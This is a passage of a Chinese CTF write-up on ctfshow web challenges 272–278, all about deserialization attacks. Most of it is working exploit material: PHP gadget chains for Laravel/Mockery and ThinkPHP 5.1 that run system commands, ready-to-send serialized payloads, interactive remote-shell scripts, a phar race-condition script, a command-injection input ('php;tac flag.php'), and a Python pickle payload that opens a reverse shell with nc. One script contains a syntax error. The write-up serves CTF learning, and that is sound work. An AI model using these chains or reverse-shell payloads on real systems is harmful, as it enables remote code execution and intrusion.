        public function __construct(){
            $this->events=new Dispatcher();
            $this->event=new QueuedCommand();
        }
    }
}
namespace Illuminate\Foundation\Console{

    use Mockery\Generator\MockDefinition;

    class QueuedCommand
    {
        public $connection;
        public function __construct(){
            $this->connection=new MockDefinition();
        }
    }
}
namespace Illuminate\Bus{

    use Mockery\Loader\EvalLoader;

    class Dispatcher
    {
        protected $queueResolver;
        public function __construct(){
            $this->queueResolver=[new EvalLoader(),'load'];
        }
    }
}
namespace Mockery\Loader{
    class EvalLoader
    {

    }
}
namespace Mockery\Generator{
    class MockConfiguration
    {
        protected $name="feng";
    }
    class MockDefinition
    {
        protected $config;
        protected $code;
        public function __construct()
        {
            $this->code="<?php system('cat /flag');exit()?>";
            $this->config=new MockConfiguration();
        }
    }
}

namespace{

    use Illuminate\Broadcasting\PendingBroadcast;

    echo urlencode(serialize(new PendingBroadcast()));
}
```

## web273

- 描述: 同上

同样的用上面的就可以了

## web274

- 描述: 同上

ThinkPHP V5.1 反序列化漏洞, 入口查看源码就可以拿到了

```php
<?php
namespace think\process\pipes{

    use think\model\Pivot;

    class Windows
    {
        private $files = [];
        public function __construct(){
            $this->files[]=new Pivot();
        }
    }
}
namespace think{
    abstract class Model
    {
        protected $append = [];
        private $data = [];
        public function __construct(){
            $this->data=array(
              'cmd'=>new Request()
            );
            $this->append=array(
                'cmd'=>array(
                    'hello'=>'world'
                )
            );
        }
    }
}
namespace think\model{

    use think\Model;

    class Pivot extends Model
    {

    }
}
namespace think{
    class Request
    {
        protected $hook = [];
        protected $filter;
        protected $config = [
            // 表单请求类型伪装变量
            'var_method'       => '_method',
            // 表单ajax伪装变量
            'var_ajax'         => '',
            // 表单pjax伪装变量
            'var_pjax'         => '_pjax',
            // PATHINFO变量名 用于兼容模式
            'var_pathinfo'     => 's',
            // 兼容PATH_INFO获取
            'pathinfo_fetch'   => ['ORIG_PATH_INFO', 'REDIRECT_PATH_INFO', 'REDIRECT_URL'],
            // 默认全局过滤方法 用逗号分隔多个
            'default_filter'   => '',
            // 域名根，如thinkphp.cn
            'url_domain_root'  => '',
            // HTTPS代理标识
            'https_agent_name' => '',
            // IP代理获取标识
            'http_agent_ip'    => 'HTTP_X_REAL_IP',
            // URL伪静态后缀
            'url_html_suffix'  => 'html',
        ];
        public function __construct(){
            $this->hook['visible']=[$this,'isAjax'];
            $this->filter="system";
        }
    }
}
namespace{

    use think\process\pipes\Windows;

    echo base64_encode(serialize(new Windows()));
}
```

payload:

```
GET:
?data=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czozOiJjbWQiO2E6MTp7czo1OiJoZWxsbyI7czo1OiJ3b3JsZCI7fX1zOjE3OiIAdGhpbmtcTW9kZWwAZGF0YSI7YToxOntzOjM6ImNtZCI7TzoxMzoidGhpbmtcUmVxdWVzdCI6Mzp7czo3OiIAKgBob29rIjthOjE6e3M6NzoidmlzaWJsZSI7YToyOntpOjA7cjo4O2k6MTtzOjY6ImlzQWpheCI7fX1zOjk6IgAqAGZpbHRlciI7czo2OiJzeXN0ZW0iO3M6OToiACoAY29uZmlnIjthOjEwOntzOjEwOiJ2YXJfbWV0aG9kIjtzOjc6Il9tZXRob2QiO3M6ODoidmFyX2FqYXgiO3M6MDoiIjtzOjg6InZhcl9wamF4IjtzOjU6Il9wamF4IjtzOjEyOiJ2YXJfcGF0aGluZm8iO3M6MToicyI7czoxNDoicGF0aGluZm9fZmV0Y2giO2E6Mzp7aTowO3M6MTQ6Ik9SSUdfUEFUSF9JTkZPIjtpOjE7czoxODoiUkVESVJFQ1RfUEFUSF9JTkZPIjtpOjI7czoxMjoiUkVESVJFQ1RfVVJMIjt9czoxNDoiZGVmYXVsdF9maWx0ZXIiO3M6MDoiIjtzOjE1OiJ1cmxfZG9tYWluX3Jvb3QiO3M6MDoiIjtzOjE2OiJodHRwc19hZ2VudF9uYW1lIjtzOjA6IiI7czoxMzoiaHR0cF9hZ2VudF9pcCI7czoxNDoiSFRUUF9YX1JFQUxfSVAiO3M6MTU6InVybF9odG1sX3N1ZmZpeCI7czo0OiJodG1sIjt9fX19fX0=&cmd=tac /flag
```

大佬脚本:

```python
import requests, base64, time


def round(command: str, arg: str):
    url = "http://ac6ae592-f5db-448b-81bd-3544af090bcb.challenge.ctf.show/"  # 记得保留/
    payload = b'O:27:"think\\process\\pipes\\Windows":1:{s:34:"\x00think\\process\\pipes\\Windows\x00files";a:1:{i:0;O:17:"think\\model\\Pivot":2:{s:9:"\x00*\x00append";a:1:{s:1:"a";a:2:{i:0;s:4:"calc";i:1;s:0:"";}}s:17:"\x00think\\Model\x00data";a:1:{s:1:"a";O:13:"think\\Request":4:{s:7:"\x00*\x00hook";a:1:{s:7:"visible";a:2:{i:0;s:13:"think\\Request";i:1;s:6:"isAjax";}}s:9:"\x00*\x00config";a:10:{s:10:"var_method";s:7:"_method";s:8:"var_ajax";s:6:"whoami";s:8:"var_pjax";s:5:"_pjax";s:12:"var_pathinfo";s:1:"s";s:14:"pathinfo_fetch";a:3:{i:0;s:14:"ORIG_PATH_INFO";i:1;s:18:"REDIRECT_PATH_INFO";i:2;s:12:"REDIRECT_URL";}s:14:"default_filter";s:0:"";s:15:"url_domain_root";s:0:"";s:16:"https_agent_name";s:0:"";s:13:"http_agent_ip";s:14:"HTTP_X_REAL_IP";s:15:"url_html_suffix";s:4:"html";}s:8:"\x00*\x00param";a:1:{s:6:"whoami";s:arg_l:"arg";}s:9:"\x00*\x00filter";a:1:{i:0;s:function_l:"function";}}}}}}'
    payload = payload.replace(b"function_l", str(len(command)).encode())
    payload = payload.replace(b"function", command.encode())

    payload = payload.replace(b"arg_l", str(len(arg)).encode())
    payload = payload.replace(b"arg", arg.encode())
    params = {"r": "test/ss", "data": base64.b64encode(payload).decode()}
    while True:
        try:
            resp = requests.get(url, params=params)
            break
        except:
            time.sleep(0.1)

    while True:
        try:
            resp = requests.get(url+"1")
            break
        except:
            time.sleep(0.1)

    return resp.text


if __name__ == '__main__':
    print("请输入命令...")
    while True:
        command = "system"
        arg = input(">>> ")
        if arg == "exit":
            break
        if arg == "":
            continue
        res = round(command, arg + " | tee 1")
        print(res[:-1])
```

## web275

- 描述: 同上

```php
<?php
/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @link: https://ctfer.com
*/
highlight_file(__FILE__);

class filter{
    public $filename;
    public $filecontent;
    public $evilfile=false;

    public function __construct($f,$fn){
        $this->filename=$f;
        $this->filecontent=$fn;
    }
    public function checkevil(){
        if(preg_match('/php|\.\./i', $this->filename)){
            $this->evilfile=true;
        }
        if(preg_match('/flag/i', $this->filecontent)){
            $this->evilfile=true;
        }
        return $this->evilfile;
    }
    public function __destruct(){
        if($this->evilfile){
            system('rm '.$this->filename);
        }
    }
}

if(isset($_GET['fn'])){
    $content = file_get_contents('php://input');
    $f = new filter($_GET['fn'],$content);
    if($f->checkevil()===false){
        file_put_contents($_GET['fn'], $content);
        copy($_GET['fn'],md5(mt_rand()).'.txt');
        unlink($_SERVER['DOCUMENT_ROOT'].'/'.$_GET['fn']);
        echo 'work done';
    }

}else{
    echo 'where is flag?';
}
```

`__destruct`方法有`system`函数, 而filename可控(传入fn->f->filename), 只需要满足`checkevil`中的任意一个方法即可RCE

利用分号闭合前面的rm命令即可执行新的命令:

```
GET:
?fn=php;ls
```

发现回显当前目录文件, 直接拿到flag:

```
?fn=php;tac flag.php
```

还可以条件竞争

## web276

- 描述: 同上

```php
<?php
/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @link: https://ctfer.com
*/
highlight_file(__FILE__);

class filter{
    public $filename;
    public $filecontent;
    public $evilfile=false;
    public $admin = false;

    public function __construct($f,$fn){
        $this->filename=$f;
        $this->filecontent=$fn;
    }
    public function checkevil(){
        if(preg_match('/php|\.\./i', $this->filename)){
            $this->evilfile=true;
        }
        if(preg_match('/flag/i', $this->filecontent)){
            $this->evilfile=true;
        }
        return $this->evilfile;
    }
    public function __destruct(){
        if($this->evilfile && $this->admin){
            system('rm '.$this->filename);
        }
    }
}

if(isset($_GET['fn'])){
    $content = file_get_contents('php://input');
    $f = new filter($_GET['fn'],$content);
    if($f->checkevil()===false){
        file_put_contents($_GET['fn'], $content);
        copy($_GET['fn'],md5(mt_rand()).'.txt');
        unlink($_SERVER['DOCUMENT_ROOT'].'/'.$_GET['fn']);
        echo 'work done';
    }

}else{
    echo 'where is flag?';
}

where is flag?
```

没有反序列化的入口, 但是可以利用`file_put_content`配合phar伪协议不通过`unserialize()`直接进行反序列化

[利用 phar 拓展 php 反序列化漏洞攻击面](https://paper.seebug.org/680/), [浅析Phar反序列化](https://www.freebuf.com/articles/web/305292.html)

> 如果要生成phar文件, 你得先修改`php.ini`文件, 将`phar.readonly`设置为`Off`, 直接拿的图:

![img](https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/1637308824_61975998719c7c61c06c1.png)

先生成phar文件, 然后尝试上传:

```php
<?php

    class filter{
        public $filename;
        public $filecontent;
        public $evilfile = true;
        public $admin = true;

        public function __construct($f='',$fn=''){
            $this->filename='1;tac fla?.ph?';
            $this->filecontent=$fn;
        }
    }

    // # 下面是通用的格式
    $phar = new Phar('phar.phar');
    // $phar = startBuffering();	我这里加上会报错, 所以删了
    $phar->setStub('<?php __HALT_COMPILER();?>');

    $a=new filter();
    $phar->setMetadata($a);
    $phar->addFromString('test.txt','test');
    // $phar->stopBuffering();
```

然后是官方脚本, 运行即可拿到flag, 记得放在同一目录下

```python
import requests
import time
import threading

success = False
# 获取phar文件数据
def getPhar(phar):
    with open(phar,'rb') as f:
        return data = f.read()

# 写入phar文件
def writePhar(url, data):
    requests.post(url, data)

# unlink文件
def unlinkPhar(url, data):
    global  success
    r = requests.post(url, data).text
    if 'ctfshow{' in r and success is False:
        print(r)
        success =True

def main():
    global success
    url = 'http://aa8d9ac3-04f5-4cff-8749-dea43ea98613.challenge.ctf.show/'
    phar = getPhar('phar.phar')

    while success is False:
        time.sleep(1)
        w = threading.Thread(target=writePhar, args=(url+'?fn=1.phar', phar))
        s = threading.Thread(target=unlinkPhar, args=(url+'?fn=phar://1.phar/1.txt', ''))
        w.start()
        s.start()

if __name__ == '__main__':
    main()
```

## web277

- 描述: 同上

查看源码发现提示:

```html
where is flag?<!--/backdoor?data= m=base64.b64decode(data) m=pickle.loads(m) -->
```

[pickle反序列化初探](https://xz.aliyun.com/t/7436?), pickle是python下的序列化与反序列化包, 以下是一个简单的例子:

```python
import pickle

class aclass():
    def p(self):
        print('this is a class')

# 正常调用
test = aclass()
test.p()
# 序列化和反序列化后
test_ser = pickle.dumps(test)
print(test_ser)
test_unser = pickle.loads(test_ser)
test_unser.p()
```

我们利用`__reduce__`反序列化后自动执行我们构造的命令, 由于题目没有回显, 只能反弹shell或者外带

> os.system没有导入, 所以用的eval

反弹shell

```python
import pickle
import base64

class cmd():
    def __reduce__(self):
        return (eval,("__import__('os').popen('nc xxxxxxxx 9999 -e /bin/sh').read()",))

c = cmd()
c = pickle.dumps(c)
print(base64.b64encode(c))
```

payload:

```
/backdoor?data=...
```

dns外带: 没成功

还有大佬提供的虚拟终端脚本, 先镶起来以后再看

```python
import requests, base64, time


def round(command: str, arg: str):
    url = "http://39995c7b-513e-4c09-9e77-01499da948bc.challenge.ctf.show/"  # 以/结尾
    payload = f'''cos\n{command}\n(S'{arg}'\ntR.'''.encode()
    params = {"r": "test/ss", "data": base64.b64encode(payload).decode()}
    while True:
        try:
            resp = requests.get(url+"backdoor", params=params)
            break
        except:
            time.sleep(0.1)

    while True:
        try:
            resp = requests.get(url+"static/1")
            break
        except:
            time.sleep(0.1)

    return resp.text


if __name__ == '__main__':
    print("请输入命令...")
    while True:
        command = "system"
        arg = input(">>> ")
        if arg == "exit":
            break
        if arg == "":
            continue
        arg = f'mkdir -p /app/static && {arg} > /app/static/1'
        res = round(command, arg + "")
        print(res[:-1])
```

## web278

- 描述: 过滤了os.system

上题用的os.popen, 所以可以继续用

大佬脚本同理, 改system为popen即可

### 附

绕过os可以用另一种:

```
cbuiltins\ngetattr\np0\n(cbuiltins\ndict\nS'get'\ntRp1\n(cbuiltins\nglobals\n)RS'__builtins__'\ntRp2\n0g0\n(g2\nS'eval'\ntR(S'whoami'\ntR.
```

本质就是通过`getattr`函数获取`builtins`模块中`dict`类的`get`方法，然后执行`globals()`，其返回值是一个`dict`，所以可以用刚刚得到的`get`方法获取内部的值，这里选择取出`builtins`模块本身的引用。等价于执行`dict.get(globals(),'__builtins__')`，利用该引用，就能获取到`builtins`模块内部的`eval`方法，再压栈想要执行的命令，然后R指令执行，`.`是结束符

相关文件

- [[../../../ctf/ctf基础/反序列化]]
